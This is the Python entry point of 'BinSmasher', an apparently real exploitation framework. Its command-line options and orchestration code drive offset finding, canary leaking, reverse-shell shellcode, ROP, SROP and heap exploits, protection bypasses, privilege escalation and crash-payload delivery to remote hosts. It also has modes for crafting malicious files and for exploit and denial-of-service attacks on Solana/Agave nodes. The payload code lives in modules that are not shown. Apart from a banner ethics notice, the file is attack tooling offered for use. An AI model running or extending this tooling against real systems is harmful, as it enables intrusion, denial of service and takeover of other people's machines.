#!/usr/bin/env python3
"""BinSmasher – entry point.

Run directly:   python src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 -t
Installed:      binsmasher binary -b ./vuln --host 127.0.0.1 --port 4444 -t
"""
import sys
import os

# Make sure the directory containing this file is on sys.path so that
# the sibling packages (utils, analyzer, exploiter, fuzzer, file_exploiter)
# are importable regardless of the working directory.
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import argparse
import logging

from rich.console import Console
from rich.panel import Panel

from utils import ExploitConfig, setup_logging, RichHelpFormatter, console
from utils._process import set_core_pattern, default_log_path, no_core_preexec
from analyzer import BinaryAnalyzer
from exploiter import ExploitGenerator, _run_udp_spawn_exploit
from fuzzer import Fuzzer
from file_exploiter import FileExploiter
from utils import print_summary

# ── Banner ────────────────────────────────────────────────────────────────────

def _banner() -> str:
    import subprocess
    try:
        text = subprocess.check_output(
            ["figlet", "-f", "slant", "BinSmasher"],
            stderr=subprocess.DEVNULL,
        ).decode()
    except Exception:
        text = (
            "  ____  _      _____                      __\n"
            " / __ )(_)___ / ___/____ ___  ____ ______/ /_  ___  _____\n"
            "/ __  / / __ \\__ \\/ __ `__ \\/ __ `/ ___/ __ \\/ _ \\/ ___/\n"
            "/ /_/ / / / / /__/ / / / / / / /_/ (__  ) / / /  __/ /\n"
            "/_____/_/_/ /_/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/\n"
        )
    return (
        f"[bold cyan]{text}[/]\n"
        "[bold white]Ultimate Cross-Platform Binary Exploitation Framework[/]\n"
        "[dim]Authorized use only: CTF · pentest · security research[/]"
    )

# ── CLI parser ────────────────────────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BinSmasher — binary exploitation framework",
        formatter_class=RichHelpFormatter,
        epilog=(
            "Subcommands:\n"
            "  binary   Exploit native ELF/PE binaries\n"
            "  solana   Agave / Solana SVM security audit\n"
            "  file     Generate malicious files\n"
        ),
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── binary ───────────────────────────────────────────────────────────────
    bp = sub.add_parser("binary", help="Exploit native binaries",
                        formatter_class=RichHelpFormatter)
    bp.add_argument("-b", "--binary",  required=True, help="Path to target binary")
    bp.add_argument("-c", "--cmd",     default="id",  help="Command for shellcode")
    bp.add_argument("-p", "--pattern-size", type=int, default=200)
    bp.add_argument("-r", "--return-addr",  default=None)
    bp.add_argument("--return-offset", type=int, default=80)
    bp.add_argument("-t", "--test-exploit", action="store_true")
    bp.add_argument("-l", "--log-file", default="binsmasher.log",
                        help="Log file path (default: auto in /tmp/binsmasher_*/logs/)")

    net = bp.add_argument_group("network")
    net.add_argument("--host", default="localhost")
    net.add_argument("--port", type=int, default=4444)
    net.add_argument("--tls",  action="store_true")
    net.add_argument("--output-ip",   default="127.0.0.1")
    net.add_argument("--output-port", type=int, default=6666)

    pay = bp.add_argument_group("payload")
    pay.add_argument("--reverse-shell", action="store_true")
    pay.add_argument("--file-input", choices=["mp3", "raw"])
    pay.add_argument("--binary-args", default="")
    pay.add_argument("--payload-data", default=None)
    pay.add_argument("--udp", action="store_true")
    pay.add_argument("--spawn-target", action="store_true")
    pay.add_argument("--bad-bytes", default="", dest="bad_bytes_str")

    fzg = bp.add_argument_group("fuzzing")
    fzg.add_argument("--fuzz",          action="store_true")
    fzg.add_argument("--mutation-fuzz", action="store_true")
    fzg.add_argument("--afl-fuzz",      action="store_true")
    fzg.add_argument("--afl-timeout",   type=int, default=60)
    fzg.add_argument("--frida",         action="store_true")
    fzg.add_argument("--protocol",      default="raw")

    adv = bp.add_argument_group("advanced")
    adv.add_argument("--heap-exploit",         action="store_true")
    adv.add_argument("--safeseh-bypass",       action="store_true")
    adv.add_argument("--privilege-escalation", action="store_true")
    adv.add_argument("--cfi-bypass",           action="store_true")
    adv.add_argument("--stack-pivot",          action="store_true", dest="stack_pivot")
    adv.add_argument("--largebin-attack",      action="store_true", dest="largebin")
    adv.add_argument("--gdb-mode", default="pwndbg",
                     choices=["pwndbg", "peda", "vanilla"], dest="gdb_mode")
    adv.add_argument("--srop",  dest="force_srop", action="store_true")
    adv.add_argument("--orw",   dest="force_orw",  action="store_true")
    adv.add_argument("--flag-path", default="/flag")

    dos = bp.add_argument_group("dos / scripts")
    dos.add_argument("--dos",             action="store_true")
    dos.add_argument("--generate-scripts",action="store_true")

    # ── solana ────────────────────────────────────────────────────────────────
    sp = sub.add_parser("solana", help="Agave/Solana auditing",
                        formatter_class=RichHelpFormatter)
    sp.add_argument("--rpc", default="http://localhost:8899", dest="solana_rpc")
    sp.add_argument("--source-path", default=None)
    sp.add_argument("-b", "--binary", default=None)
    sp.add_argument("-l", "--log-file", default="binsmasher.log")
    sp.add_argument("--exploit-type", dest="agave_exploit_type",
                    choices=["svm-bpf", "deser", "dos-quic", "snapshot-assert"])
    sp.add_argument("--bpf-fuzz", action="store_true")
    sp.add_argument("--host", default="localhost")
    sp.add_argument("--port", type=int, default=8900)

    # ── file ──────────────────────────────────────────────────────────────────
    fp = sub.add_parser("file", help="Generate malicious files",
                        formatter_class=RichHelpFormatter)
    fp.add_argument("--format", required=True)
    fp.add_argument("--offset", type=int, default=256)
    fp.add_argument("--technique", choices=["overflow", "fmtstr", "inject"], default="overflow")
    fp.add_argument("--shellcode-hex", default=None)
    fp.add_argument("-o", "--output-dir", default=".")
    fp.add_argument("--all-formats", action="store_true")
    fp.add_argument("-l", "--log-file", default="binsmasher.log")

    return parser

# ── run_binary ─────────────────────────────────────────────────────────────────

def run_binary(cfg):
    log = logging.getLogger("binsmasher")

    analyzer  = BinaryAnalyzer(cfg.binary, cfg.log_file)
    platform, arch = analyzer.setup_context()

    findings, target_function, functions = analyzer.static_analysis()
    if not functions:
        log.error("No functions detected — cannot proceed.")
        print_summary(None, None, None, "None", "Failed", None, None,
                      ["Run: r2 -c afl <binary> to verify functions"])
        return

    (stack_exec, nx, aslr, canary_enabled,
     relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()

    fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
    exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                  cfg.log_file, cfg.tls, cfg.binary_args)

    if cfg.afl_fuzz:      fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
    if cfg.mutation_fuzz: fuzzer.mutation_fuzz()
    if cfg.fuzz:          fuzzer.fuzz_target(cfg.file_input, cfg.protocol, cfg.binary_args_list)
    if cfg.frida:         analyzer.frida_analyze(cfg.binary_args_list)

    lib_name, lib_version, offsets, base_addr = analyzer.load_library_offsets()

    bad_bytes: set = set()
    if getattr(cfg, "bad_bytes_str", ""):
        raw = cfg.bad_bytes_str.replace("\\x", "").replace("0x", "").replace(" ", "")
        try:
            bad_bytes = set(bytes.fromhex(raw))
        except Exception as exc:
            log.warning(f"Could not parse --bad-bytes '{cfg.bad_bytes_str}': {exc}")

    udp_spawn_mode = bool(cfg.payload_data and cfg.udp and cfg.spawn_target)
    pie_base_udp   = None
    libc_base_udp  = None

    if udp_spawn_mode:
        log.info("UDP+spawn mode: offset detection via cyclic injection…")
        offset, pie_base_udp, target_function = fuzzer.find_offset_udp_payload(
            payload_template=cfg.payload_data.encode("utf-8", errors="surrogateescape"),
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            pattern_size_start=cfg.pattern_size,
            target_function=target_function,
        )
        libc_base_udp = getattr(fuzzer, "_last_libc_base", None)
        stack_addr = None
    else:
        if cfg.payload_data:
            fuzzer.send_raw_payload(
                cfg.payload_data.encode("utf-8", errors="surrogateescape"),
                use_udp=cfg.udp,
            )
        offset, stack_addr, target_function = exploiter.find_offset(
            cfg.pattern_size, functions, retries=5)

    suggestions = []
    if offset is None:
        suggestions += [
            f"Verify binary is running: nc -zvu {cfg.host} {cfg.port}",
            "Add --spawn-target so BinSmasher manages the process",
            f"Inspect functions: r2 -c afl {cfg.binary}",
        ]
        log.error("Could not determine offset.")
        print_summary(None, None, None, "None", "Failed", None, target_function,
                      suggestions, nx=nx, pie=pie, relro=relro,
                      canary_enabled=canary_enabled, aslr=aslr)
        return

    is_fork = False
    if not udp_spawn_mode:
        is_fork = exploiter._detect_fork_server()

    canary = None
    if canary_enabled and not udp_spawn_mode:
        canary = exploiter.leak_canary(brute_force=is_fork)
        if not canary:
            suggestions.append("Canary leak failed — increase fmt string index range")

    if cfg.dos_only:
        crash_payload  = exploiter.generate_crash_payload(offset)
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets, exploit_type="auto",
            binary_path=cfg.binary)
        console.print(Panel(
            f"Crash payload: [cyan]{len(crash_payload)}[/] bytes\n"
            f"Crash script:  [green]{crash_script}[/]\n"
            f"Exploit script:[green]{exploit_script}[/]",
            title="DOS / Script Generation", border_style="yellow"))
        if cfg.test_exploit:
            try:
                from pwn import remote
                conn = remote(cfg.host, cfg.port, timeout=5)
                conn.sendline(crash_payload)
                try:
                    conn.recvall(timeout=2)
                except Exception:
                    pass
                conn.close()
                log.info("Crash payload sent — target should have crashed")
            except Exception as exc:
                log.warning(f"Crash send failed: {exc}")
        print_summary(offset, None, None, "dos_crash", "Success",
                      canary, target_function, suggestions,
                      nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
        return

    fmt_payload = None
    if findings["format_string_functions"] and not udp_spawn_mode:
        fmt_payload = exploiter.generate_format_string_payload(offset, relro)

    if cfg.return_addr:
        return_addr = int(cfg.return_addr, 16)
    elif udp_spawn_mode and pie_base_udp:
        return_addr = 0
    elif stack_addr:
        return_addr = stack_addr + cfg.return_offset
    else:
        return_addr = 0

    shellcode = None
    if not fmt_payload and not cfg.force_srop and not cfg.force_orw:
        shellcode = exploiter.generate_shellcode(
            cfg.cmd, cfg.output_ip, cfg.output_port, arch, cfg.reverse_shell)
        if not shellcode:
            log.error("Shellcode generation failed.")
            print_summary(offset, stack_addr, return_addr, "None", "Failed",
                          canary, target_function, suggestions,
                          nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
            return

    if cfg.heap_exploit and findings["heap_functions"]:
        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
    if findings["heap_functions"]:
        exploiter.create_uaf_exploit(offset, base_addr, offsets)

    # First pass: build payload (no network fire yet unless test_exploit)
    success, exploit_type, used_function = exploiter.create_exploit(
        offset=offset, shellcode=shellcode, return_addr=return_addr,
        test_exploit=False,
        return_offset=cfg.return_offset,
        nx=nx, aslr=aslr, canary_enabled=canary_enabled,
        format_string_payload=fmt_payload, functions=functions,
        file_input=cfg.file_input, canary=canary, relro=relro,
        safeseh=safeseh, cfg=cfg_flag,
        findings=findings, base_addr=base_addr, offsets=offsets,
        libc_version=lib_version or "2.31", pie=pie,
        force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    if udp_spawn_mode and cfg.payload_data:
        min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
        coredump_rip = getattr(fuzzer, "_last_coredump_rip", 0)
        if pie_base_udp and libc_base_udp:
            success, exploit_type = _run_udp_spawn_exploit(
                cfg=cfg, fuzzer=fuzzer, offset=offset,
                pie_base=pie_base_udp, libc_base=libc_base_udp,
                coredump_rip=coredump_rip, min_crash=min_crash,
                bad_bytes=bad_bytes)
        else:
            log.warning("Cannot exploit: PIE base or libc base not available")
            success = False

    elif cfg.test_exploit and not udp_spawn_mode:
        success, exploit_type, used_function = exploiter.create_exploit(
            offset=offset, shellcode=shellcode, return_addr=return_addr,
            test_exploit=True, return_offset=cfg.return_offset,
            nx=nx, aslr=aslr, canary_enabled=canary_enabled,
            format_string_payload=fmt_payload, functions=functions,
            file_input=cfg.file_input, canary=canary, relro=relro,
            safeseh=safeseh, cfg=cfg_flag,
            findings=findings, base_addr=base_addr, offsets=offsets,
            libc_version=lib_version or "2.31", pie=pie,
            force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    if cfg.cfi_bypass:
        cfi_chain = exploiter.cfi_bypass(offset, canary)
        if cfi_chain:
            log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")

    if platform == "windows":
        if cfg.safeseh_bypass:
            exploiter.create_safeseh_bypass(offset, safeseh)
        if cfg_flag == "Enabled":
            exploiter.cfg_bypass(offset)

    if success and cfg.privilege_escalation:
        exploiter.attempt_privilege_escalation()

    if cfg.generate_scripts:
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets,
            exploit_type=exploit_type, binary_path=cfg.binary)
        try:
            from pwn import ELF as _ELF
            _elf = _ELF(cfg.binary, checksec=False)
            WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
                      "easy", "print_flag", "cat_flag"]
            win_addr = next(
                (a for n, a in _elf.symbols.items()
                 if a and any(kw == n.lower() or n.lower().startswith(kw)
                              for kw in WIN_KW)), 0)
            gdb_file = fuzzer.generate_gdb_script(
                cfg.binary, offset, win_addr=win_addr,
                mode=getattr(cfg, "gdb_mode", "pwndbg"))
            log.info(f"GDB script: {gdb_file}")
        except Exception:
            pass
        log.info(f"Scripts written: {crash_script}, {exploit_script}")

    if success:
        suggestions.append("Exploit sent — verify output on your listener")
    else:
        suggestions += [
            "Try --heap-exploit for heap-based vulnerabilities",
            "Try --srop to force Sigreturn-Oriented Programming chain",
            "Try --orw if target has seccomp sandbox blocking execve",
            "Try --mutation-fuzz to find additional crash inputs",
            "Use gdb/r2 to inspect memory and verify offsets",
        ]

    # Resolve display return address
    display_ra = return_addr
    if exploit_type == "ret2win" and (not display_ra or display_ra < 0x1000):
        try:
            from pwn import ELF as _ELF
            WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
                      "easy", "print_flag", "cat_flag"]
            _elf = _ELF(cfg.binary, checksec=False)
            for name, addr in _elf.symbols.items():
                if addr and any(kw == name.lower() or name.lower().startswith(kw)
                                for kw in WIN_KW):
                    display_ra = addr
                    break
        except Exception:
            pass

    print_summary(offset, stack_addr, display_ra, exploit_type,
                  "Success" if success else "Failed",
                  canary, used_function or target_function, suggestions,
                  nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)


# ── run_solana ────────────────────────────────────────────────────────────────

def run_solana(args):
    fuzzer = Fuzzer(args.binary or "/dev/null", args.host, args.port,
                    args.log_file, "linux")
    if args.source_path and args.binary:
        analyzer = BinaryAnalyzer(args.binary, args.log_file)
        analyzer.grep_unsafe_source(args.source_path)
    if args.bpf_fuzz or args.agave_exploit_type == "svm-bpf":
        fuzzer.fuzz_bpf(args.solana_rpc)
    etype = args.agave_exploit_type
    if etype == "deser":
        fuzzer.exploit_deser(args.solana_rpc)
    elif etype == "dos-quic":
        fuzzer.dos_quic()
    elif etype == "snapshot-assert":
        fuzzer.exploit_snapshot_assert(args.solana_rpc)


# ── run_file ──────────────────────────────────────────────────────────────────

def run_file(args):
    log = logging.getLogger("binsmasher")
    fe  = FileExploiter(output_dir=args.output_dir)
    sc  = None
    if args.shellcode_hex:
        try:
            sc = bytes.fromhex(args.shellcode_hex.replace("\\x", "").replace("0x", ""))
        except Exception as exc:
            log.error(f"Invalid shellcode hex: {exc}")
            return
    if args.all_formats:
        results = fe.craft_all(args.offset, sc, args.technique)
        console.print(Panel(f"Generated {len(results)} payloads in {args.output_dir}/",
                             title="File Exploiter", border_style="cyan"))
    else:
        payload, path = fe.craft(args.format, args.offset, sc, args.technique)
        console.print(Panel(f"Payload: {path}\nSize: {len(payload)} bytes",
                             title="File Exploiter", border_style="cyan"))


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    # Redirect core dumps to /tmp on startup — never in project root
    set_core_pattern()
    console.print(Panel(_banner(), title="BinSmasher 🔨", border_style="cyan"))
    console.print(Panel(
        "[bold yellow]WARNING[/]: Use only on systems you own or have "
        "explicit written authorization to test.\nUnauthorized access is illegal.",
        title="⚠️  Ethics Notice", border_style="yellow"))

    parser = _build_parser()
    args   = parser.parse_args()

    # Redirect log files that have no directory component to temp dir
    # so they never land in the project root / CWD.
    _lf = getattr(args, "log_file", None) or "binsmasher.log"
    if not os.path.dirname(_lf):  # bare filename → redirect to temp
        args.log_file = default_log_path(_lf)
    else:
        args.log_file = _lf

    if args.mode == "binary":
        cfg = ExploitConfig(
            binary=args.binary, host=args.host, port=args.port,
            pattern_size=args.pattern_size, return_addr=args.return_addr,
            return_offset=args.return_offset, test_exploit=args.test_exploit,
            log_file=args.log_file, output_ip=args.output_ip, output_port=args.output_port,
            reverse_shell=args.reverse_shell, cmd=args.cmd, fuzz=args.fuzz,
            afl_fuzz=args.afl_fuzz, frida=args.frida, file_input=args.file_input,
            protocol=args.protocol, tls=args.tls, heap_exploit=args.heap_exploit,
            safeseh_bypass=args.safeseh_bypass,
            privilege_escalation=args.privilege_escalation,
            binary_args=args.binary_args, afl_timeout=args.afl_timeout,
            mutation_fuzz=args.mutation_fuzz, cfi_bypass=args.cfi_bypass,
            force_srop=args.force_srop, force_orw=args.force_orw,
            flag_path=args.flag_path,
            dos_only=args.dos, generate_scripts=args.generate_scripts,
            payload_data=args.payload_data, udp=args.udp,
            spawn_target=args.spawn_target)
        cfg.bad_bytes_str = args.bad_bytes_str
        log = setup_logging(cfg.log_file)
        cfg.validate()
        run_binary(cfg)

    elif args.mode == "solana":
        setup_logging(args.log_file)
        run_solana(args)

    elif args.mode == "file":
        setup_logging(args.log_file)
        run_file(args)


if __name__ == "__main__":
    main()
